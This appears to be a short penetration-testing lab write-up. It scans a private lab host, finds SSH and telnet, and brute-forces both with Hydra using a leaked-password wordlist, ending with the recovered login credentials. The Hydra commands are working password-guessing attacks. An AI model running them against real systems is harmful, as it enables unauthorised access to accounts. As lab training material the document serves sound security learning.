# Bruteforce Lab

My IP: `192.168.99.100`
Target IP: `192.168.99.22`

1. Scan target

nmap results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
23/tcp open  telnet  Linux telnetd
```

Let's try Hydra to brute-force both of these protocols.


SSH: `hydra ssh://192.168.99.22 -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f -o ssh_pass.txt`

telnet: `hydra telnet://192.168.99.22 -L minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f -o telnet_pass.txt `
```
[22][ssh] host: 192.168.99.22   login: sysadmin   password: secret
[23][telnet] host: 192.168.99.22   login: sysadmin   password: secret
```
